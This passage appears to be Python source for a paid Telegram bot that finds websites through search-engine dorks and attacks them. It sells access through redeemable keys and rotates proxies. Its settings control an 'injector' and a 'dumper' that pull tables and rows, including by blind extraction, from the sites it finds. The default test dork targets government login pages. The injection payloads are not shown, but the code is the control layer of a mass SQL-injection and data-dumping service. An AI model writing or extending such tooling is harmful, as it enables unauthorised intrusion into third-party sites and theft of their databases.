    KEYS[key] = {"days": days, "created": datetime.now().isoformat(timespec="seconds")}
    save_all()
    await update.effective_message.reply_text(
        "🔑 <code>%s</code>\n📅 %d din" % (key, days), parse_mode=ParseMode.HTML)


AWAIT_HANDLERS["bc_text"] = lambda *a, **k: input_broadcast(*a, **k)
async def _dork_domain_shim(upd, ctx, txt):
    return await input_pro_set(upd, ctx, "domains", txt)


AWAIT_HANDLERS["deep_max"] = lambda *a, **k: input_deep_max(*a, **k)
AWAIT_HANDLERS["nc_kw"] = lambda *a, **k: input_nc_kw(*a, **k)
AWAIT_HANDLERS["nc_name"] = lambda *a, **k: input_nc_name(*a, **k)
AWAIT_HANDLERS["px_paste"] = lambda *a, **k: input_px_paste(*a, **k)
AWAIT_HANDLERS["rot_paste"] = lambda *a, **k: input_rot_paste(*a, **k)
AWAIT_HANDLERS["dork_domain"] = lambda *a, **k: input_pro_set(*a, "domains", k.get("text", ""), ) if False else _dork_domain_shim(*a, **k)
AWAIT_HANDLERS["gen_count"] = lambda *a, **k: input_gen_count(*a, **k)
AWAIT_HANDLERS["gen_kw"] = lambda *a, **k: input_gen_kw(*a, **k)
AWAIT_HANDLERS["dpgen_count"] = lambda *a, **k: input_dpgen_count(*a, **k)
AWAIT_HANDLERS["dpgen_kw"] = lambda *a, **k: input_dpgen_kw(*a, **k)
AWAIT_HANDLERS["pro_combo"] = lambda *a, **k: input_pro_combo(*a, **k)
def _pro_await(key):
    async def _h(upd, ctx, txt):
        return await input_pro_set(upd, ctx, key, txt)
    return _h


for _pk in ("domains", "params", "filetypes", "sfilters", "pfilters"):
    AWAIT_HANDLERS["pro_" + _pk] = _pro_await(_pk)


def _qa_await(kind):
    async def _h(upd, ctx, txt):
        return await input_qa_kind(upd, ctx, kind, txt)
    return _h


for _qk in ("keywords", "dorks", "urls"):
    AWAIT_HANDLERS["qa_" + _qk] = _qa_await(_qk)


async def input_tutorial(upd, ctx, txt):
    """Admin — tutorial video URL set."""
    val = (txt or "").strip()
    if val == "-":
        SETTINGS["tutorial"] = ""
        jsave("settings", SETTINGS)
        await upd.effective_message.reply_text("🗑 Tutorial video removed.",
                                               reply_markup=kb_admin())
        return
    if not re.match(r"^https?://", val, re.I):
        await upd.effective_message.reply_text(
            "❌ The link must start with <code>https://</code>.\n"
            "YouTube: <code>https://youtu.be/XXXX</code>", parse_mode=ParseMode.HTML)
        await_set(ctx, "a_tut")
        ctx.user_data["await_admin"] = True
        return
    SETTINGS["tutorial"] = val
    jsave("settings", SETTINGS)
    await upd.effective_message.reply_text(
        "✅ Tutorial video set:\n<code>%s</code>\n\n"
        "Ab user HELP me 🎬 <b>HOW TO USE</b> button dekhega." % esc(val[:150]),
        parse_mode=ParseMode.HTML, reply_markup=kb_admin())


async def input_feat_msg(upd, ctx, txt):
    """Admin — kisi feature ka custom maintenance message."""
    key = ctx.user_data.get("feat_key") or ""
    if key not in FEATURES:
        await upd.effective_message.reply_text("❌ Feature not found.", reply_markup=kb_admin())
        return
    val = (txt or "").strip()
    if val == "-":
        feat_set(key, True, "")
        note = "↩️ Default message wapas"
    else:
        feat_set(key, True, val[:400])
        note = "✅ Custom message set (the feature is currently OFF)"
    await upd.effective_message.reply_text(
        "%s\n\n<b>%s</b>\n\n<i>%s</i>"
        % (note, FEATURES[key][0], esc(val[:300] or "default"), ),
        parse_mode=ParseMode.HTML, reply_markup=feat_kb())


AWAIT_HANDLERS["a_tut"] = lambda *a, **k: input_tutorial(*a, **k)
AWAIT_HANDLERS["feat_msg"] = lambda *a, **k: input_feat_msg(*a, **k)


async def input_broadcast(update, context, text: str):
    if not is_admin(update.effective_user.id):
        return
    msg = await update.effective_message.reply_text("📣 Sending…")
    sent, fail = 0, 0
    for uid in list(USERS.keys()):
        try:
            await context.bot.send_message(chat_id=int(uid), text=text)
            sent += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    try:
        await msg.edit_text("📣 <b>Broadcast done</b>\n\n✅ Sent: <code>%d</code>\n"
                            "❌ Fail: <code>%d</code>" % (sent, fail), parse_mode=ParseMode.HTML)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════════
async def on_error(update, context):
    logger.error("handler error: %s", context.error, exc_info=context.error)


async def _post_init(app) -> None:
    """Telegram ke "/" menu me commands dikhein (redeem included)."""
    try:
        await app.bot.set_my_commands([
            BotCommand("start", "🏠 Menu"),
            BotCommand("redeem", "🔑 Redeem a key"),
            BotCommand("help", "📖 Help"),
            BotCommand("theme", "🎨 Change theme"),
            BotCommand("myid", "🪪 Apni ID"),
            BotCommand("ping", "🏓 Bot zinda?"),
            BotCommand("gtest", "🐦 Free Google test"),
            BotCommand("apis", "🔑 SERP API list"),
            BotCommand("batch", "📦 Batch size (admin)"),
            BotCommand("engines", "⚡ Parser speed (fewer engines)"),
            BotCommand("enginetest", "🔬 Which engines work on your net"),
            BotCommand("fresh", "🆕 Fresh dork history"),
            BotCommand("admin", "👑 Admin panel"),
        ])
        logger.info("✅ Bot commands set (/redeem included)")
    except Exception as exc:
        logger.warning("set_my_commands skip: %s", exc)


def build_app() -> Application:
    _patch_telegram_safe()
    app = (ApplicationBuilder().token(TOKEN).concurrent_updates(True)
           .post_init(_post_init).build())
    # group -1: har /command = naya intent → purana adhoora input prompt band
    app.add_handler(MessageHandler(filters.COMMAND, _cmd_intent_clear), group=-1)
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("myid", cmd_myid))
    app.add_handler(CommandHandler("ping", cmd_ping))
    app.add_handler(CommandHandler("setkey", cmd_setkey))
    app.add_handler(CommandHandler("apis", cmd_apis))
    app.add_handler(CommandHandler("batch", cmd_batch))
    app.add_handler(CommandHandler("rotproxy", cmd_rotproxy))
    app.add_handler(CommandHandler("dnstest", cmd_dnstest))
    app.add_handler(CommandHandler("engines", cmd_engines))
    app.add_handler(CommandHandler("enginetest", cmd_enginetest))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("theme", cmd_theme))
    app.add_handler(CommandHandler("se", cmd_se))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CommandHandler("unban", cmd_unban))
    app.add_handler(CommandHandler("addkey", cmd_addkey))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("gtest", cmd_gtest))
    app.add_handler(CommandHandler("fresh", cmd_fresh))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, on_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(on_error)
    return app


def _install_signals(stop_event) -> None:
    """SIGINT / SIGTERM pe clean shutdown."""
    def _stop(*_a):
        try:
            stop_event.set()
        except Exception:
            pass
    for name in ("SIGINT", "SIGTERM", "SIGHUP"):
        sig = getattr(signal, name, None)
        if sig is None:
            continue
        try:
            asyncio.get_running_loop().add_signal_handler(sig, _stop)
        except (NotImplementedError, RuntimeError, ValueError):
            try:
                signal.signal(sig, _stop)
            except Exception:
                pass


selfcheck = {}     # startup diagnostics (/ping me dikhta hai)


async def _self_check(app) -> None:
    """Startup pe Telegram side verify — webhook / conflict / token."""
    try:
        me = await app.bot.get_me()
        logger.info("🤖 Bot: @%s (id %s) — token OK", me.username, me.id)
        selfcheck["username"] = me.username
    except Exception as exc:
        logger.error("❌ getMe FAILED — token wrong/revoked: %s", exc)
        print("\n" + "=" * 62)
        print("  ❌ TOKEN IS WRONG OR REVOKED")
        print("=" * 62)
        print("  BotFather → /revoke → naya token → ./setconfig.sh --token <naya>")
        print("=" * 62 + "\n")
        return

    # webhook set hai? -> polling chalti hi nahi. Hata do.
    try:
        wh = await app.bot.get_webhook_info()
        if wh.url:
            logger.warning("⚠️ A webhook was set (%s) — it blocked polling. Removing it…", wh.url)
            selfcheck["webhook_removed"] = wh.url
            await app.bot.delete_webhook(drop_pending_updates=False)
            logger.info("✅ Webhook removed — polling can run now")
        else:
            logger.info("✅ No webhook set (polling mode)")
    except Exception as exc:
        logger.warning("webhook check skip: %s", exc)

    # conflict check — koi dusra bot same token pe?

    selfcheck["ok"] = True
    # admin ko online message
    try:
        for aid in ADMIN_IDS:
            await app.bot.send_message(
                chat_id=int(aid),
                text=("🐍 <b>%s ONLINE</b>\n%s\n🤖 @%s\n🧵 PID %d\n%s\n\n"
                      "<i>Use /ping any time to check</i>"
                      % (BRAND, T()["div"], me.username, os.getpid(), T()["div"])),
                parse_mode=ParseMode.HTML)
    except Exception as exc:
        logger.warning("admin online msg fail: %s", exc)



def engines_text(context=None) -> str:
    cur = user_mode(context)
    rows = []
    for key in ("fast", "normal", "max"):
        mark = "✅ " if key == cur else ""
        rows.append("   %s<b>%s</b> — <code>%s</code>"
                    % (mark, ENGINE_LABEL[key], ", ".join(ENGINE_SETS[key])))
    return (H("ENGINES MODE", ENGINE_LABEL[cur]) + "\n\n"
            + "\n".join(rows) + "\n\n"
            + B("How to change") + "\n"
            + "<code>/engines fast</code> — 3 engines (fastest on a phone)\n"
            + "<code>/engines normal</code> — 5 engines\n"
            + "<code>/engines max</code> — all 9 engines (proxy recommended)\n\n"
            + "<i>DDG Lite • DDG • Bing work without a proxy. "
              "Google and Yandex block your IP without one — that is where the errors come from.</i>")


async def cmd_enginetest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ /enginetest [dork] — kaun sa engine aapke net pe BINA PROXY chalta hai."""
    dork = " ".join(context.args or []).strip() or "site:gov.in inurl:login"
    mode = user_mode(context)
    engs = engine_list(mode)
    msg = await update.effective_message.reply_text(
        "🔬 Testing <b>%d engines</b> (no proxy)…\n<code>%s</code>"
        % (len(engs), esc(dork[:80])), parse_mode=ParseMode.HTML)
    conn = mk_connector(limit=len(engs) + 2, force_close=True)
    results = []

    async def one(session, eng):
        t0 = time.time()
        try:
            urls = await fetch_engine(session, eng, dork, None, timeout=8.0)
        except Exception:
            urls = []
        return eng, len(urls or []), time.time() - t0

    async with aiohttp.ClientSession(connector=conn) as session:
        results = await asyncio.gather(*[one(session, e) for e in engs],
                                       return_exceptions=True)
    lines, alive, dead = [], 0, 0
    for r in results:
        if isinstance(r, Exception) or not r:
            continue
        eng, cnt, took = r
        reason = engine_reason((ENGINE_LAST.get(eng) or ("", 0))[0])
        if cnt:
            alive += 1
            lines.append("✅ <b>%s</b> — <code>%d URLs • %.1fs</code>"
                         % (esc(eng), cnt, took))
        else:
            dead += 1
            lines.append("❌ <b>%s</b> — <code>%s</code>" % (esc(eng), esc(reason)))
    card = (H("ENGINE TEST", "%d ✅ • %d ❌" % (alive, dead)) + "\n\n"
            + "\n".join(lines) + "\n\n"
            + KV("Mode", "<b>%s</b>" % ENGINE_LABEL[mode], "🎛") + "\n"
            + KV("Proxy", "not used (direct connection)", "🧅") + "\n\n"
            + ((B("Sab ✅") + "\n" + P("Everything works on your network — the parser will run fine."))
               if dead == 0 else
               (B("The ❌ engines") + "\n"
                + P("That engine is blocked on your IP — it will not work without a proxy.") + "\n"
                + P("Run only on the engines that work:") + "\n"
                + "<code>/engines fast</code> (ddgl • ddg • bing)") + "\n\n"
                + KV("Net", "If everything is ❌ with DNS fail" if dead == len(engs) else "some engines ok",
                     "📶")))
    try:
        await msg.edit_text(card, parse_mode=ParseMode.HTML,
                            reply_markup=RK([
                                [InlineKeyboardButton("⚡ FAST MODE", callback_data="pr:eng")],
                                [InlineKeyboardButton("⬅️ PARSER", callback_data="m:parse")],
                            ]))
    except Exception:
        pass


async def cmd_engines(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ /engines fast|normal|max — kitne search engines chalein."""
    arg = str((context.args or [""])[0] or "").lower().strip()
    if arg in ENGINE_SETS:
        context.user_data["engines_mode"] = arg
        if is_admin(update.effective_user.id):
            sset("engines_mode", arg)
            extra = "\n<i>(admin — sab users ka default bhi set)</i>"
        else:
            extra = ""
        await update.effective_message.reply_text(
            (H("MODE SET", ENGINE_LABEL[arg]) + "\n\n"
             + KV("Engines", "<code>%s</code>" % ", ".join(ENGINE_SETS[arg]), "⚙️")
             + "\n" + KV("Proxy", "optional" if arg != "max" else "recommended", "🧅")
             + "\n\n" + B("Ab PARSER chalao") + extra),
            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:parse"))
        return
    await update.effective_message.reply_text(engines_text(context), parse_mode=ParseMode.HTML)


async def _cmd_intent_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Koi bhi /command aaya = naya intent, purana await cancel."""
    try:
        await_clear(context)
    except Exception:
        pass


BATCH_KEYS = {
    "proxy":   ("proxy_batch", 200, 20000, "Proxy check batch", 4000, "📦"),
    "inj":     ("inj_batch", 1, 5000, "Injector batch", 200, "💉"),
    "want":    ("want_alive", 0, 100000, "Target alive (0 = saare)", 0, "🎯"),
    "conc":    ("concurrency", 50, 1000, "Parallel check", 400, "⚡"),
    "timeout": ("check_timeout", 3, 30, "Proxy check timeout (s)", 6, "⏱"),
    "limit":   ("parse_url_limit", 0, 200000, "URL limit (0 = ALL)", 0, "🌐"),
    "budget":  ("parse_budget", 60, 7200, "Scan time budget (min→sec)", 1800, "⏳"),
    "injtargets": ("inj_targets", 6, 300, "Injector tests per URL", 36, "🔍"),
    "injconc": ("inj_conc", 5, 200, "Injector parallel requests", 30, "⚡"),
    "injtime": ("inj_timeout", 3, 30, "Injector request timeout (s)", 6, "⏱"),
    "injproxy": ("inj_proxy", 0, 1, "Injector: proxy use (0=off, 1=on)", 0, "🧅"),
    "dumpconc": ("dump_conc", 2, 60, "Dumper parallel pages", 12, "📄"),
    "dumptime": ("dump_timeout", 5, 45, "Dumper page timeout (s)", 10, "⌛"),
    "dumptables": ("dump_tables", 1, 100, "Dump: tables per URL", 8, "🗃"),
    "dumprows": ("dump_rows", 1, 500, "Dump: rows per table", 8, "📄"),
    "dumpblind": ("dump_blind", 0, 1, "Dump: blind extraction (0/1)", 1, "🙈"),
    "dumpblindrows": ("dump_blind_rows", 0, 50, "Dump: blind rows per table", 0, "🐢"),
    "dumpreq": ("dump_requests", 100, 5000, "Dump: request cap per URL", 500, "🔋"),
    "pages": ("parse_pages", 1, 10, "Parser pages per dork", 1, "📄"),
    "threads": ("parse_threads", 1, 10, "Parser parallel dorks", 6, "🧵"),
    "ptimeout": ("parse_timeout", 4, 40, "Parser engine timeout (s)", 8, "⏱"),
}


def batch_card() -> str:
    rows = []
    for k, (skey, lo, hi, label, dflt, emoji) in BATCH_KEYS.items():
        val = sget(skey, dflt)
        if val is None:
            shown = "-"
        elif skey == "parse_budget":
            shown = "%s min" % fmt(max(1, int(val) // 60))
        elif skey == "parse_url_limit" and not int(val or 0):
            shown = "ALL (as many as found)"
        else:
            shown = fmt(val)
        rows.append(KV(label, "<code>%s</code>" % shown, emoji))
    return (H("BATCH SETTINGS", "admin") + "\n\n" + "\n".join(rows) + "\n\n"
            "<b>How to set:</b>\n"
            "<code>/batch proxy 4000</code>\n"
            "<code>/batch inj 500</code>\n"
            "<code>/batch want 0</code> — 0 means check every proxy\n"
            "<code>/batch conc 600</code>\n"
            "<code>/batch timeout 8</code>\n"
            "<code>/batch limit 0</code> — 0 = as many as found (ALL)\n"
            "<code>/batch budget 20</code> — scan runs for 20 minutes\n"
            "<code>/batch injtargets 36</code> — injector tests per URL\n"
            "<code>/batch injconc 30</code> · <code>/batch injtime 6</code>\n"
            "<code>/batch injproxy 0</code> — 0 = direct (tez), 1 = free proxies\n"
            "<code>/batch dumpconc 12</code> · <code>/batch dumptime 10</code>\n"
            "<code>/batch dumptables 15</code> · <code>/batch dumprows 50</code>\n"
            "<code>/batch dumpblind 1</code> · <code>/batch dumpreq 800</code>\n"
            "<code>/batch trial 1</code> — trial lock ON (files locked)\n\n"
            "<i>Proxy batching checks 60k proxies in slices: 4k → next 4k → … "
            "until every one is done. 2000–4000 is best on a phone.</i>")


async def cmd_batch(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ /batch — batch size for proxy check / injector (admin only)."""
    if not is_admin(update.effective_user.id):
        await update.effective_message.reply_text("🔒 Admin only.")
        return
    args = [a.strip() for a in (context.args or []) if a.strip()]
    if len(args) < 2:
        await update.effective_message.reply_text(batch_card(), parse_mode=ParseMode.HTML)
        return
    key, val = args[0].lower(), args[1]
    if key == "trial":
        on = str(val).lower() in ("1", "on", "yes", "true")
        sset("trial_lock", 1 if on else 0)
        await update.effective_message.reply_text(
            "🔒 <b>Trial lock</b> = <code>%s</code>\n\n%s"
            % ("ON — users without a key can scan, files locked"
               if on else "OFF — everything normal", batch_card()),
            parse_mode=ParseMode.HTML)
        return
    if key not in BATCH_KEYS:
        await update.effective_message.reply_text(
            "❌ <b>That is not a key.</b>\n\nCorrect format: <code>%s</code>"
            % ", ".join(BATCH_KEYS), parse_mode=ParseMode.HTML)
        return
    skey, lo, hi, label = BATCH_KEYS[key][:4]
    try:
        v = int(float(val))
    except Exception:
        await update.effective_message.reply_text("❌ Number do, jaise <code>4000</code>.",
                                                  parse_mode=ParseMode.HTML)
        return
    if skey == "parse_budget":
        v = v * 60                              # minutes me maanga hai
    v = max(lo, min(hi, v))
    sset(skey, v)
    await update.effective_message.reply_text(
        "✅ <b>%s</b> = <code>%s</code>\n\n%s" % (esc(label), fmt(v), batch_card()),
        parse_mode=ParseMode.HTML)


async def cmd_apis(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """SERP API list — free + paid, sach ke saath (koi 'unlimited' jhooth nahi)."""
    await update.effective_message.reply_text(
        APIS_TEXT, parse_mode=ParseMode.HTML, disable_web_page_preview=True)


APIS_TEXT = (
    H("SERP APIs", "free + paid • real numbers") + "\n\n"
    "<i>Rates checked for 2026. No API is truly unlimited — "
    "anyone claiming 'unlimited' is hiding their real limit.</i>\n\n"
    "━━ 🆓 <b>FREE</b> ━━\n\n"
    "🔵 <b>Serper.dev</b> — <b>2,500 queries one-time</b>\n"
    "   No card needed. Full Google results, dorks (inurl:/site:) supported.\n"
    "   When it runs out: $1/1k → $0.30/1k in bulk\n"
    "   <code>/setkey serper KEY</code>\n\n"
    "🟢 <b>SerpApi</b> — <b>250/month</b> (renews every month)\n"
    "   50/hour burst. No card. Google/Bing/Yandex and more.\n"
    "   Paid: $25/1k (expensive)\n"
    "   <code>/setkey serpapi KEY</code>\n\n"
    "🦁 <b>Brave Search API</b> — <b>$5 credit/month</b> (~1,000 queries)\n"
    "   Card required (abuse check only, no charge).\n"
    "   Independent index — different results than Google (new targets show up).\n"
    "   <code>/setkey brave KEY</code>\n\n"
    "🐦 <b>Free Google (no key)</b> — ON by default\n"
    "   Public endpoint pool, no signup. Rate-limited, can die any time.\n"
    "   The endpoint you gave me works the same way — <b>it has no published "
    "limit, and it can go down at any moment</b> (depends on the owner).\n"
    "   That is why I built a pool: if one dies, the next one takes over.\n"
    "   Add: <code>/setkey gapi https://...</code>\n\n"
    "🌐 <b>Common Crawl</b> — fully free, unlimited, no key\n"
    "   URLs from the Index API. No dork support, domain/path search only.\n"
    "   Always on in the bot.\n\n"
    "🕰 <b>Wayback CDX</b> — fully free, unlimited, no key\n"
    "   Old URLs and parameters. Always on in the bot.\n\n"
    "⚙️ <b>SearXNG</b> — self-host = <b>unlimited</b>, $0\n"
    "   Run it on your own PC/VPS; public instances are free but rate-limited.\n"
    "   If you want real unlimited search, this is the only route.\n\n"
    "🔶 <b>Bright Data SERP</b> — 5,000/month free (KYC required)\n"
    "   $1.50/1k after verification. Enterprise grade, rarely fails.\n\n"
    "🔷 <b>Tavily</b> — ~1,000 credits/month free — AI search, weak dork support\n"
    "🔹 <b>Exa</b> — $10 credit/month — semantic search, no dorks\n"
    "🔸 <b>SearchApi.io</b> — 100 free one-time, then $4/1k\n"
    "🔺 <b>Searlo</b> — 3,000 one-time free, then ~$3/1k\n\n"
    "━━ 💰 <b>PAID (cheap → expensive)</b> ━━\n\n"
    "1️⃣ <b>Serper</b> — $0.30–1.00 / 1k  ← cheapest, best value\n"
    "2️⃣ <b>DataForSEO / Serpent</b> — ~$0.60 / 1k\n"
    "3️⃣ <b>Bright Data</b> — $1.50 / 1k (most reliable)\n"
    "4️⃣ <b>Oxylabs SERP</b> — ~$2 / 1k\n"
    "5️⃣ <b>SerpApi</b> — $25 / 1k (premium features, expensive)\n\n"
    "━━ ⚠️ <b>THE TRUTH</b> ━━\n\n"
    "• <b>Google CSE</b> — <b>closed</b> to new customers (fully shut down Jan 2027)\n"
    "• <b>No API is 'unlimited'</b> — if someone says so, they are hiding the limit\n"
    "• The API you gave me works right now — <b>but it is somebody's personal "
    "service and can stop tomorrow</b>. Keep one free key as backup "
    "(Serper 2,500); both can run together.\n\n"
    "━━ ✅ <b>MY ADVICE</b> ━━\n\n"
    "Now: Free Google pool + Common Crawl + Wayback (0 cost)\n"
    "Backup: Serper 2,500 free (no card) — a 5 minute signup\n"
    "If you need volume: Serper paid $0.30/1k — 10k dorks for about $3\n\n"
    "Check status: <code>/setkey</code>"
)


async def cmd_dnstest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /dnstest host — system DNS + DoH dono check (proxy block debug)."""
    if not is_admin(update.effective_user.id):
        return
    host = " ".join(context.args or []).strip() or "p.webshare.io"
    sys_ip = ""
    try:
        loop = asyncio.get_event_loop()
        sys_ip = await asyncio.wait_for(loop.run_in_executor(None, socket.gethostbyname, host), 6)
    except Exception as exc:
        sys_ip = "FAIL (%s)" % type(exc).__name__
    doh_ip = await doh_resolve(host)
    conn_url, _h, ip, src = await proxy_connect_url("http://u:p@%s:80" % host)
    await update.effective_message.reply_text(
        (H("DNS TEST", host) + "\n\n"
         + KV("System DNS", "<code>%s</code>" % esc(str(sys_ip)), "🌐") + "\n"
         + KV("DoH", "<code>%s</code>" % esc(doh_ip or "fail"), "☁️") + "\n"
         + KV("Bot uses", "<code>%s</code>%s" % (esc(ip or "—"),
                                                 (" (%s)" % src) if src else ""), "🤖") + "\n\n"
         + P("DoH chalta hai to proxy DNS block ho ke bhi kaam karega.")),
        parse_mode=ParseMode.HTML)


async def cmd_rotproxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /rotproxy host:port:user:pass — rotating endpoint add + test."""
    uid = update.effective_user.id
    if not is_admin(uid):
        return
    arg = " ".join(context.args or []).strip()
    if not arg:
        cur = rot_proxies()
        await update.effective_message.reply_text(
            (H("ROTATING PROXY", "%d set" % len(cur)) + "\n\n"
             + ("\n".join("• <code>%s</code>" % esc(_mask_proxy(u)) for u in cur) + "\n\n"
                if cur else P("No rotating endpoint set.") + "\n\n")
             + B("Add") + "\n<code>/rotproxy p.webshare.io:80:USER-rotate:PASS</code>\n"
             + "<i>Formats: host:port:user:pass · user:pass@host:port · http://user:pass@host:port</i>\n\n"
             + B("Test") + "\n<code>/rotproxy test</code>"),
            parse_mode=ParseMode.HTML)
        return
    if arg.lower() in ("test", "t"):
        urls = rot_proxies()
        if not urls:
            await update.effective_message.reply_text(
            "Add one first: <code>/rotproxy host:port:user:pass</code>", parse_mode=ParseMode.HTML)
            return
        msg = await update.effective_message.reply_text("🧪 Testing rotation…")
        res = await rot_live_test(urls, tries=3)
        await msg.edit_text(rot_test_card(res), parse_mode=ParseMode.HTML)
        return
    if arg.lower() in ("clear", "off", "remove"):
        rot_save([])
        await update.effective_message.reply_text("🗑 Rotating endpoint removed.")
        return
    px = parse_proxies(arg)
    if not px:
        await update.effective_message.reply_text(
            "❌ Could not parse. Example: <code>/rotproxy p.webshare.io:80:USER-rotate:PASS</code>",
            parse_mode=ParseMode.HTML)
        return
    rot_save(px)
    sset("proxy_rotate", 1)
    msg = await update.effective_message.reply_text(
        "🔁 Saved <b>%d</b> endpoint(s) — testing…" % len(px), parse_mode=ParseMode.HTML)
    res = await rot_live_test(px, tries=3)
    await msg.edit_text(rot_test_card(res), parse_mode=ParseMode.HTML)


def _mask_proxy(url: str) -> str:
    """user:pass@host → user:***@host (screen pe password chhupao)."""
    m = re.match(r"^(\w+://)?([^:@/]+):([^@/]*)@(.+)$", str(url or ""))
    if not m:
        return str(url or "")
    return "%s%s:***@%s" % (m.group(1) or "", m.group(2), m.group(4))


async def cmd_setkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: optional API keys (Google CSE / SerpAPI). Free tiers."""
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.effective_message.reply_text("🚫 Admin only.")
        return
    k = api_keys()
    args = list(context.args or [])
    if not args:
        txt = (H("API KEYS", "all optional") + "\n\n"
               "Bina kisi key ke bot chalta hai "
               "(7 engines + Common Crawl + Wayback + free Google).\n\n"
               "🔑 <b>Serper</b> — <b>2,500 FREE</b> queries (no card)\n"
               "   google.serper.dev → signup → key\n"
               "   <code>/setkey serper KEY</code>\n\n"
               "🔑 <b>SerpApi</b> — 250 searches/mahina free\n"
               "   <code>/setkey serpapi KEY</code>\n\n"
               "🔑 <b>Brave Search</b> — $5 credit/mahina (~1,000)\n"
               "   <code>/setkey brave KEY</code>\n\n"
               "🔑 <b>Google CSE</b> — 100/din (naye users band ho gaye)\n"
               "   <code>/setkey cse API_KEY CX_ID</code>\n\n"
               "🐦 <b>Free Google (bina key)</b> — pool of endpoints\n"
               "   add: <code>/setkey gapi https://...</code>\n"
               "   band: <code>/setkey gjerm -</code>\n\n"
               "📋 Poori list: <code>/apis</code>\n\n"
               "%s"
               % ("\n".join([
                   KV("Serper", "✅ set" if k["serper"] else "⚪ not set", "🔵"),
                   KV("SerpApi", "✅ set" if k["serpapi"] else "⚪ not set", "🟢"),
                   KV("Brave", "✅ set" if k["brave"] else "⚪ not set", "🦁"),
                   KV("CSE", "✅ set" if (k["cse_key"] and k["cse_cx"]) else "⚪ not set", "🔴"),
                   KV("Free Google", ("⚪ OFF" if not gj_enabled() else
                                      "✅ ON • %d ok / %d fail • %d endpoints"
                                      % (GJ_STATE["ok"], GJ_STATE["fail"], len(gj_pool()))), "🐦"),
                   KV("Common Crawl", "✅ always on", "🌐"),
               ])))
        await update.effective_message.reply_text(txt, parse_mode=ParseMode.HTML)
        return
    what = args[0].lower()
    if what in ("gjerm", "gj", "gfree", "google"):
        val = (args[1].strip() if len(args) > 1 else "")
        if not val:
            await update.effective_message.reply_text(
                "Usage:\n<code>/setkey gjerm -</code>  (turn it off)\n"
                "<code>/setkey gjerm https://...</code>  (URL badlo)", parse_mode=ParseMode.HTML)
            return
        if val == "-":
            sset("gj_url", "-")
            await update.effective_message.reply_text("⚪ Free Google turned OFF.")
            return
        if not val.startswith("http"):
            await update.effective_message.reply_text("❌ URL must start with <code>http...</code>.",
                                                      parse_mode=ParseMode.HTML)
            return
        sset("gj_url", val)
        GJ_STATE.update({"fail": 0, "dead_until": 0.0})
        await update.effective_message.reply_text(
            "✅ Free Google URL set:\n<code>%s</code>" % esc(val[:120]), parse_mode=ParseMode.HTML)
        return
    if what in ("serper", "brave", "serpapi"):
        if len(args) < 2:
            await update.effective_message.reply_text("Usage: /setkey %s YOUR_KEY" % what)
            return
        val = args[1].strip()
        sset(what, "" if val == "-" else val)
        note = {"serper": "2,500 free queries", "brave": "$5 credit/month",
                "serpapi": "250/month free"}[what]
        await update.effective_message.reply_text(
            "✅ %s %s" % (what.title(),
                          "hata diya" if val == "-" else "set ho gaya (%s)" % note))
        return
    if what in ("gapi", "gpool"):
        val = (args[1].strip() if len(args) > 1 else "")
        if not val:
            await update.effective_message.reply_text(
                "Usage:\n<code>/setkey gapi https://...</code> — endpoint add\n"
                "<code>/setkey gapi -</code> — pool clear", parse_mode=ParseMode.HTML)
            return
        if val == "-":
            sset("gj_pool", [])
            sset("gj_url", "")
            GJ_STATE.update({"fail": 0, "dead_until": 0.0, "idx": 0})
            await update.effective_message.reply_text("🗑 Google pool clear (default wapas).")
            return
        if not val.startswith("http"):
            await update.effective_message.reply_text("❌ URL must start with <code>http...</code>.",
                                                      parse_mode=ParseMode.HTML)
            return
        pool = list(sget("gj_pool") or [])
        if val not in pool:
            pool.append(val)
        sset("gj_pool", pool[:12])
        if not gj_enabled():               # band tha to chalu kar do
            sset("gj_url", "")
        GJ_STATE.update({"fail": 0, "dead_until": 0.0})
        await update.effective_message.reply_text(
            "✅ Endpoint add (%d total):\n<code>%s</code>"
            % (len(gj_pool()), esc(val[:120])), parse_mode=ParseMode.HTML)
        return
    if what == "cse":
        if len(args) < 3:
            await update.effective_message.reply_text("Usage: /setkey cse API_KEY CX_ID")
            return
        sset("cse_key", "" if args[1] == "-" else args[1].strip())
        sset("cse_cx", "" if args[1] == "-" else args[2].strip())
        await update.effective_message.reply_text("✅ Google CSE set (100/day free)")
        return
    await update.effective_message.reply_text(
        "❓ Options: <code>serper</code>, <code>serpapi</code>, <code>brave</code>, "
        "<code>cse</code>, <code>gapi</code>, <code>gjerm</code>, <code>theme</code>",
        parse_mode=ParseMode.HTML)


async def cmd_ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kya bot zinda hai? + theme + uptime + free Google status."""
    t0 = time.time()
    msg = await update.effective_message.reply_text("🏓 …")
    ms = int((time.time() - t0) * 1000)
    up = int(time.time() - START_TS)
    if not gj_enabled():
        gj = "⚪ OFF"
    elif not gj_alive():
        gj = "⏸ 5 min cooldown"
    else:
        gj = "✅ ON (%d ok / %d fail)" % (GJ_STATE["ok"], GJ_STATE["fail"])
    txt = (H("PONG", "%s ms" % ms) + "\n\n"
           "🟢 Bot zinda hai\n"
           "🤖 @%s\n"
           "🎨 Theme: <b>%s</b>\n"
           "⏱ Uptime: <code>%dh %dm</code>\n"
           "🧵 PID: <code>%d</code>\n"
           "👥 Users: <code>%d</code>\n"
           "🐦 Free Google: %s\n"
